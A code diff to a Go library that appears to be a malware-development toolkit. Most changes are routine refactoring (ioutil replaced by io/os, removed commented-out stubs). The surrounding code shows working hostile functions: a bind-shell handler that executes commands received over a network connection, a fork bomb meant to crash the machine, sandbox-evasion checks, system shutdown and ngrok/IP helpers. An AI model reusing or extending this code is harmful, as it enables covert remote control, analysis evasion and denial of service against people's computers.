@@ -10,13 +10,12 @@ import (
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/md5"
-	crandom "crypto/rand"
+	crand "crypto/rand"
 	"encoding/base64"
 	"encoding/binary"
 	"encoding/hex"
 	"fmt"
 	"io"
-	"io/ioutil"
 	"log"
 	"math/rand"
 	"net"
@@ -39,8 +38,6 @@ import (
 	"github.com/mitchellh/go-homedir"
 	ps "github.com/mitchellh/go-ps"
 	"github.com/savaki/jq"
-	// wapi "github.com/iamacarpet/go-win64api"
-	// "tawesoft.co.uk/go/dialog"
 )
 
 var (
@@ -82,10 +79,6 @@ func handleBind(conn net.Conn) {
 		length, _ := conn.Read(buffer)
 		command := string(buffer[:length-1])
 		out, _ := CmdOut(command)
-		// parts := strings.Fields(command)
-		//   head := parts[0]
-		//   parts = parts[1:len(parts)]
-		//   out, _ := exec.Command(head,parts...).Output()
 		conn.Write([]byte(out))
 	}
 }
@@ -410,7 +403,7 @@ func GetGlobalIp() string {
 		}
 		defer resp.Body.Close()
 
-		i, _ := ioutil.ReadAll(resp.Body)
+		i, _ := io.ReadAll(resp.Body)
 		ip = string(i)
 
 		if resp.StatusCode == 200 {
@@ -543,7 +536,7 @@ func ReadFile(filename string) (string, error) {
 	}
 	defer fil.Close()
 
-	b, err := ioutil.ReadAll(fil)
+	b, err := io.ReadAll(fil)
 	if err != nil {
 		return "", err
 	}
@@ -571,7 +564,7 @@ func WriteFile(filename, data string) error {
 // where their filenames match a given pattern.
 func FilesPattern(directory, pattern string) (map[string]string, error) {
 	out_map := map[string]string{}
-	files, err := ioutil.ReadDir(directory)
+	files, err := os.ReadDir(directory)
 	if err != nil {
 		return nil, err
 	}
@@ -626,13 +619,6 @@ func Wait(interval string) {
 	time.Sleep(time.Duration(x) * time.Second)
 }
 
-// func file_info(file string) map[string]string {
-//     inf, err := os.Stat(file)
-//     return map[string]string{
-
-//     }
-// }
-
 // Forkbomb spawns goroutines in order to crash the machine.
 func Forkbomb() {
 	for {
@@ -666,28 +652,6 @@ func CmdOut(command string) (string, error) {
 	return cmdOut(command)
 }
 
-// func cmd_out_ssh(address, username, password, command string) (string, error) {
-//     config := &ssh.ClientConfig{
-//         User: username,
-//         Auth: []ssh.AuthMethod{
-//             ssh.Password(password),
-//         },
-//     }
-//     client, err := ssh.Dial("tcp", address, config)
-//     if err != nil {
-//         return "", err
-//     }
-//     session, err := client.NewSession()
-//     if err != nil {
-//         return "", err
-//     }
-//     defer session.Close()
-//     var b bytes.Buffer
-//     session.Stdout = &b
-//     err = session.Run(command)
-//     return b.String(), err
-// }
-
 // CmdOutPlatform executes a given set of commands based on the OS of the machine.
 func CmdOutPlatform(commands map[string]string) (string, error) {
 	cmd := commands[runtime.GOOS]
@@ -710,11 +674,9 @@ func CmdRun(command string) {
 	if err != nil {
 		PrintError(err.Error())
 		fmt.Println(string(output))
-		//fmt.Println(red(err.Error()) + ": " + string(output))
 	} else {
 		fmt.Println(string(output))
 	}
-	//ExitOnError("[COMMAND EXEC ERROR]", err)
 }
 
 // CmdBlind runs a command without any side effects.
@@ -724,7 +686,6 @@ func CmdBlind(command string) {
 	parts = parts[1:]
 	cmd := exec.Command(head, parts...)
 	_, _ = cmd.CombinedOutput()
-	// ExitOnError("[COMMAND EXEC ERROR]", err)
 }
 
 // CmdDir executes commands which are mapped to a string
@@ -869,13 +830,6 @@ func SandboxSleep() bool {
 	return z
 }
 
-// SandboxDisk is used to check if the environment's
-// disk space is less than a given size.
-/* sandboxDisk is missing dependency
-func SandboxDisk(size int) bool {
-	return sandboxDisk(size)
-}
-*/
 // SandboxCpu is used to check if the environment's
 // cores are less than a given integer.
 func SandboxCpu(cores int) bool {
@@ -949,7 +903,6 @@ func SandboxAll() bool {
 		SandboxProc(),
 		SandboxFilepath(),
 		SandboxCpu(2),
-		// SandboxDisk(50), Missing dependency
 		SandboxSleep(),
 		SandboxTmp(10),
 		SandboxProcnum(100),
@@ -976,7 +929,6 @@ func SandboxAlln(num int) bool {
 		SandboxProc(),
 		SandboxFilepath(),
 		SandboxCpu(2),
-		// SandboxDisk(50), Missing dependency
 		SandboxSleep(),
 		SandboxTmp(10),
 		SandboxTmp(100),
@@ -998,22 +950,6 @@ func SandboxAlln(num int) bool {
 func Shutdown() error {
 	return shutdown()
 }
-
-// func set_ttl(interval string){
-//     endSignal := make(chan bool, 1)
-//     go _sleep(interval_to_seconds(interval), endSignal)
-//     select {
-//     case <-endSignal:
-//         remove()
-//         os.Exit(0)
-//     }
-// }
-
-// func SetTTL(duration string) {
-// 	c := cron.New()
-// 	c.AddFunc("@every "+duration, remove)
-// 	c.Start()
-// }
 
 // Bind tells the process to listen to a local port
 // for commands.
@@ -1328,7 +1264,7 @@ func CopyFile(src, dst string) error {
 // TraverseCurrentDir lists all files that exist within the current directory.
 func TraverseCurrentDir() ([]string, error) {
 	files_in_dir := []string{}
-	files, err := ioutil.ReadDir(".")
+	files, err := os.ReadDir(".")
 	if err != nil {
 		return nil, err
 	}
@@ -1343,7 +1279,7 @@ func TraverseCurrentDir() ([]string, error) {
 // TraverseDir lists all files that exist within a given directory.
 func TraverseDir(dir string) ([]string, error) {
 	files_in_dir := []string{}
-	files, err := ioutil.ReadDir(dir)
+	files, err := os.ReadDir(dir)
 	if err != nil {
 		return nil, err
 	}
@@ -1437,7 +1373,7 @@ func GetNgrokURL() (string, error) {
 	}
 	defer resp.Body.Close()
 
-	json, err := ioutil.ReadAll(resp.Body)
+	json, err := io.ReadAll(resp.Body)
 	if err != nil {
 		return "", err
 	}
@@ -1457,7 +1393,6 @@ func GetNgrokURL() (string, error) {
 func ExtractIntFromString(s string) []int {
 	res := []int{}
 	re := regexp.MustCompile(`[-]?\d[\d,]*[\.]?[\d{2}]*`)
-	// fmt.Printf("String contains any match: %v\n", re.MatchString(str1)) // True
 	submatchall := re.FindAllString(s, -1)
 
 	for _, element := range submatchall {
@@ -1484,10 +1419,6 @@ func RevertSlice(s interface{}) {
 		swap(i, j)
 	}
 }
-
-// func dialog(message, title string) {
-// 	zenity.Info(message, zenity.Title(title))
-// }
 
 func SplitMultiSep(s string, seps []string) []string {
 	f := func(c rune) bool {
@@ -1523,39 +1454,9 @@ func SplitChunks(s string, chunk int) []string {
 	return chunks
 }
 
-/*
-
-func keyboard_emul(keys string) error {
-
-}
-
-func proxy_tcp() error {
-
-}
-
-func proxy_udp() error {
-
-}
-
-func proxy_http() error {
-
-}
-
-func webshell(param, password string) error {
-
-}
-
-func stamp() {
-
-}
-
-func detect_user_interaction() (bool, error) {
-
-}*/
-
 func GenerateKey() []byte {
 	random_bytes := make([]byte, 32)
-	_, err := crandom.Read(random_bytes) // Generates 32 cryptographically secure random bytes
+	_, err := crand.Read(random_bytes) // Generates 32 cryptographically secure random bytes
 	if err != nil {
 		println("Failed to generate the key.")
 		return nil
@@ -1565,7 +1466,7 @@ func GenerateKey() []byte {
 
 func GenerateIV() []byte {
 	random_bytes := make([]byte, 16)
-	_, err := crandom.Read(random_bytes) // Generates 16 cryptographically secure random bytes
+	_, err := crand.Read(random_bytes) // Generates 16 cryptographically secure random bytes
 	if err != nil {
 		println("Failed to generate IV.")
 		return nil
